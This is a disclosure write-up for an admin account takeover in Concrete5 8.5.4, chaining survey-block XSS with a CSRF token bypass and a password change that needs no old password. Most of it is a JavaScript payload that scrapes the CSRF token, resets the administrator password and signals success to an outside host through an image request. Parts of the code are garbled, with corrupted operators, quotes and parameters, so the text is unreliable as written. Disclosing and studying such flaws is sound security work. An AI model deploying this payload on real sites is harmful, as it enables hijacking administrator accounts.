# Survey XSS combined with CSRF leads to Admin Account Takeover in Concrete5 8.5.4
A Concrete CMS admin in versions below 9 did not have to provide their password when changing another user's password.

In combination with [CVE-2021-28145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28145) ("Concrete CMS (formerly concrete5) before 8.5.5 allows remote authenticated users to conduct XSS attacks via a crafted survey block. This requires at least Editor privileges": fix was included in version 8.5.5.) it is possible for a low privileged User for example a developer or a public user who is able to create surveys to insert malicious javascript code into the web application. The results of surveys can be reviewd by an administrator in his web interface under Reports > Surveys. The malicious Javascript code gets there executed as well. Concrete5 does have a CSRF protection which can be bypassed very easily by stealing the corresponding Token from the Page before executing a request. As concrete5 does not ask for the old password when changing it. It is possible to change the administrator password very easily.


# Payload
```
var ccm_token = ";
var body = ";
var regex = /[0-9]{10}\:[a-f0-9]{32}/g;
var req = new XMLHttpRequest();
var req2 = new XMLHttpRequest(); 
req.open("GET","/concrete5-8.5.4/index.php/dashboard/users/search/view/1", true); 
req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req. send(); 

req.onreadystatechange = function () { 
  if (req.readyState == 4 bb req.status == 200) { 
    body = req.responseText; 
    ccm_token = body.match(regex)[3];
   }
  }; 
setTimeout(() => { 
  confirm("Admin Account Takeover through XSS and CSRF Bypass in Concrete5 v.8.5.4 by Silky. CSRF Tok en: "+ccm_token); 
  req2.open("POST","/concrete5-8.5.4/index.php/dashboard/users/search/change_password/1", true);
  req2.setRequestHeader("X-Requested-With", "XMLHttpRequest");
  req2.setRequestHeader('Content-type', eapplication/x-www-form-urlencoded.);
  req2.send("ccm_token="+ccm_token+"&uPassword=Demonstration_by_SilkyEruPasswordConfirm=Demonstration_ by_Silkyt_ccm_consider_request_as_xhr=1"); 

req2.onreadystatechange = function () { 
  if (req2.readyState == 4 bb req2.status == 200) {
    body = req2.responseText;
    if (body.includes("Password updated successfully.")){
      console.log("Password updated successfully.");
      var myImage = new Image(0, 0);
      myImage.src = Ihttp://192.168.56.1:5686/Password_changed_successfullys;
     }
     else{
      console.log("Something went wrong");
     } 
   }
 } 
},2000); 

```




CVSS scores: 
* CVE-2021-40101 - 6.4 medium AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H
* CVE-2021-28145 - 5.4 medium CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

Resulting in a final score of 
* 7.2 high

# References:
* https://hackerone.com/bugs?report_id=1065577
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40101
* https://youtu.be/w-B-j4NadDw
* https://github.com/concrete5/concrete5/pull/9707/commits/f6bb806acfdda22860133b9586df068d4e3909a7
